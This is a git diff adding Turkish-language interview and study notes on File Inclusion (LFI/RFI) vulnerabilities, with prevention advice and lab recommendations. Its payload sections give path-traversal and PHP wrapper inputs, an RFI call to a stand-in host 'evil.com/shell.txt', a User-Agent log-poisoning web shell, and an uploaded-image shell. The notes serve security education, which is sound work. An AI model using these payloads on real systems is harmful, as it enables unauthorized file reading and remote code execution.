@@ -1,0 +1,80 @@
+## 📂 File Inclusion 10 - Mülakat Soruları ve Çalışma Notları  
+
+File Inclusion zafiyetleri siber güvenlik mülakatlarında sıkça sorulan konulardan biridir. Hem teorik bilgiyi hem de pratik kullanım örneklerini bilmek önemlidir.  
+
+---
+
+### 🎯 Temel Mülakat Soruları  
+
+**1. File Inclusion nedir?**  
+- Kullanıcı girdisinin dosya sistemi fonksiyonlarına (include, require vb.) kontrolsüz aktarılmasıyla oluşan güvenlik açığıdır.  
+
+**2. LFI ve RFI arasındaki fark nedir?**  
+- **LFI (Local File Inclusion):** Yerel dosyaların (örn. /etc/passwd) dahil edilmesi.  
+- **RFI (Remote File Inclusion):** Uzak bir sunucudan dosya dahil edilmesi (örn. http://evil.com/shell.txt).  
+
+**3. File Inclusion nasıl sömürülebilir?**  
+- `/etc/passwd` veya `C:\Windows\win.ini` gibi kritik dosyaları okumak.  
+- Log Poisoning ile zararlı kod enjekte etmek.  
+- PHP Wrappers (php://input, data://) kullanmak.  
+
+**4. File Inclusion’dan RCE (Remote Code Execution) nasıl elde edilir?**  
+- Saldırgan, PHP kodunu log dosyasına veya upload edilen dosyaya yazar.  
+- Daha sonra bu dosyayı LFI üzerinden include ederek çalıştırır.  
+
+**5. File Inclusion açıklarını nasıl önlersiniz?**  
+- Whitelist tabanlı doğrulama.  
+- Mutlak yolların kullanımı.  
+- URL include özelliğinin kapatılması.  
+
+---
+
+### 📝 Çalışma Notları  
+
+#### A. Test Edilecek Parametreler  
+- `page=`  
+- `file=`  
+- `doc=`  
+- `lang=`  
+- `?view=`, `?action=`, `?template=`  
+
+#### B. LFI Payload Örnekleri  
+?page=../../../../etc/passwd  
+?page=../../../../windows/win.ini  
+?page=php://filter/convert.base64-encode/resource=index.php  
+?page=php://input  
+
+#### C. RFI Payload Örneği  
+?page=http://evil.com/shell.txt  
+
+⚠ Not: RFI genellikle `allow_url_include = On` olduğunda çalışır.  
+
+#### D. Log Poisoning Tekniği  
+- Saldırgan User-Agent içine PHP kodu yazar:  
+ User-Agent: <?php system($_GET['cmd']); ?>  
+- Daha sonra log dosyasını include eder:  
+ ?page=../../../../var/log/apache2/access.log&cmd=id  
+
+---
+
+### 📌 Kullanım Senaryoları  
+
+**Senaryo 1:** Kullanıcı `?page=about.php` parametresi üzerinden dosya çağırıyor.  
+- Açık varsa `?page=../../../../etc/passwd` ile sistem dosyası okunabilir.  
+
+**Senaryo 2:** Upload edilen bir dosya (`shell.jpg`) içine PHP kodu gizlenmişse.  
+- `?page=uploads/shell.jpg` çağrılarak kod çalıştırılabilir.  
+
+---
+
+### ✅ Sonuç  
+
+- File Inclusion zafiyetleri hem bilgi ifşasına hem de uzaktan kod çalıştırmaya yol açabilir.  
+- Mülakatlarda sıkça “nasıl exploit edilir” ve “nasıl önlenir” soruları gelir.  
+- **Hazırlık için pratik:** DVWA, Mutillidae, bWAPP gibi lab ortamlarında LFI/RFI senaryoları denenmelidir.  
+
+📖 **Özet Not:**  
+- **LFI:** Yerel dosya okuma.  
+- **RFI:** Uzak dosya include.  
+- **Sömürü yolları:** Traversal, wrapper, log poisoning, upload.  
+- **Önlem:** Whitelist, mutlak yol, wrapper kapatma, sıkı dosya izinleri.  
